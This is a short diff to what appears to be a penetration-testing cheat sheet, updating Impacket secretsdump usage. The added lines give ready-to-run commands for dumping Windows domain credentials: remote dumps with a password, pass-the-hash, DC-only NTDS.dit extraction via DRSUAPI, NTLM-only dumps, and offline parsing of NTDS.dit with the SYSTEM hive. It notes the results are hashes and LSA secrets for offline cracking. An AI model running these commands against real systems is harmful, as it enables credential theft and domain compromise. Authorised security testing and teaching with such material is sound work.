@@ -98,10 +98,19 @@ dcomexec.py 'user:pass@10.10.10.10'
 
 ```bash
 # Remote dump with creds
-secretsdump.py 'CORP\Administrator:Passw0rd@10.10.10.10'
+impacket-secretsdump 'CORP/Administrator:Passw0rd@10.10.10.10'
 
-# Pass-the-hash mode (NT hash only)
-secretsdump.py 'CORP\user@10.10.10.10' -hashes :0123456789abcdef...
+# Pass-the-hash mode (LM:NT or :NT)
+impacket-secretsdump 'CORP/user@10.10.10.10' -hashes :0123456789abcdef0123456789abcdef
+
+# DC-only dump (skip SAM/LSA — NTDS.dit via DRSUAPI, much faster on large domains)
+impacket-secretsdump -just-dc 'CORP/Administrator:Passw0rd@dc.example.com'
+
+# Just domain NTLM hashes (no Kerberos keys)
+impacket-secretsdump -just-dc-ntlm 'CORP/Administrator:Passw0rd@dc.example.com'
+
+# From an offline NTDS.dit + SYSTEM hive (e.g., after diskshadow + robocopy /b)
+impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
 ```
 
 **Output:** NTLM hashes, cached creds, and (when possible) LSA secrets suitable for offline cracking.
